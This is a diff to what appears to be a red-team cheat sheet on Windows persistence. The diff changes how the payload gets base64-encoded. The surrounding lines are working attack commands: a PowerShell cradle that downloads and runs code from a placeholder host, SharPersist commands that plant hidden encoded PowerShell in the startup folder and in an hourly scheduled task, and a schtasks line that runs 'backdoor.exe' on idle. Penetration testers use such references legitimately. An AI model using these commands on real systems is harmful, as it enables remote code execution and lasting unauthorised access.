@@ -16,7 +16,7 @@
 - Download an execute cradle as persistence
 ```
 str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
-
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -f "UserEnvSetup" -m add
 ```
 
@@ -47,7 +47,7 @@ schtasks /create /tn "NotEvil" /tr C:\backdoor.exe /sc onidle /i 10
 - Download an execute cradle as persistence
 ```
 str='IEX ((new-object net.webclient).downloadstring("http://x.x.x.x/a"))'
-echo -en $str | iconv -t UTF-16LE | base64 -w 0
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <BASE64>" -n "Updater" -m add -o hourly
 ```
 
